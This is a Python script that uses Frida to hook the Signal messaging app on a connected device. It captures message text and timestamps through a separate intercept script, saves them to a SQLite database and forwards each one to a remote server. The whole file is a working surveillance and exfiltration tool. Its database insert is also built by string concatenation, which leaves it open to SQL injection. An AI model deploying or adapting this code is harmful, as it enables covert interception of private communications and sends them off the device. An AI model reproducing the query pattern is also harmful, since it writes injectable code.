import frida
import time
import sqlite3
import sender

# Connect to the sqlite database, not checking for the same thread becase the
# frida intercept script and the on_message(message, data) is running on a different thread.
sqlite_connection = sqlite3.connect("Client/signal_messages.db", check_same_thread=False)

#create the controller for the database and create the table if it does not exist
sqlite_controller = sqlite_connection.cursor()
sqlite_controller.execute("CREATE TABLE IF NOT EXISTS messages (body TEXT, timestamp TEXT)")

try:
    current_connected_device = frida.get_usb_device()
except frida.InvalidArgumentError:
    print("No device connected. Please connect a device and try again.")
    quit()

#Need to do this or the Java.perform() will not work
time.sleep(1)

def exit():
    print("Exiting...")
    sqlite_connection.commit()
    sqlite_controller.close()
    print("Successfully saved messages to database.")
    quit()

def on_message(message, data):
    if message['type'] == 'send':
        #set the value to be inserted into the database
        value = "\'" + message['payload']['messageText'] + "\', \'" + message['payload']['timestamp'] + "\'"
        sqlite_controller.execute("INSERT INTO messages VALUES " + "(" + value + ")")
        
        #send the message to the server, forrmatted as a JSON object
        sender.send_to_server({
            "Message" : message['payload']['messageText'],
            "Timestamp" : message['payload']['timestamp']
        })

try:
    session = current_connected_device.attach("Signal")
    print("Attached to Signal")
except frida.ServerNotRunningError:
    print("Frida Server is not running on the device. Please start the Frida Server and try again.")
    quit()

script = session.create_script(open("Client/intercept.js", "r").read())
script.on('message', on_message);
script.load()


print("Script loaded. Type 'exit' to quit.")
while True:
    try:
        command = input()
        if command == "exit":
            exit()
    except KeyboardInterrupt:
        exit()

